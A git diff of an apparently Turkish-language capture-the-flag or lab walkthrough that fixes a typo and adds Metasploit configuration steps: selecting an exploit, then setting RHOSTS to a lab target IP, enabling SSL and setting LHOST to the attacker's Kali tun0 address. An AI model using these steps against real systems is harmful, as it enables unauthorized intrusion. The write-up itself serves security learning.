@@ -41,7 +41,15 @@ Terminal ekranımda ``` msfconsole ``` komutu ile Metasploit başlatıyorum. Ard
 
 ![Screenshot_2](https://user-images.githubusercontent.com/34964480/90020558-af380a00-dcb8-11ea-9c6a-4c21a7e3548c.png)
 
-Buduğum bu exploiti kullanmak için exploit sırasını şeçmem gerekli bunun için ``` use 0 ``` komutunu kullandım.
+Bulduğum bu exploiti kullanmak için exploit sırasını şeçmem gerekli bunun için ``` use 0 ``` komutunu kullandım.
 
 Şimdi seçeneklere bir göz atalım ```options``` komutu seçenekleri gösterecektir.
+
+![Screenshot_3](https://user-images.githubusercontent.com/34964480/90020879-2077bd00-dcb9-11ea-8745-ed7c0d3258c2.png)
+
+Sırasıyla ;
+            1 - ```set RHOSTS <buraya hedef ip adresi > ``` bizimki bu şekilde ``` set RHOSTS 10.10.90.55 ```
+            2 - ```set SSL true ```
+            3 - ```set LHOST <buraya kali tun0 ip adresi > <bunun sudo ifconfig komutu ile görebiliriz> ```
+            
 
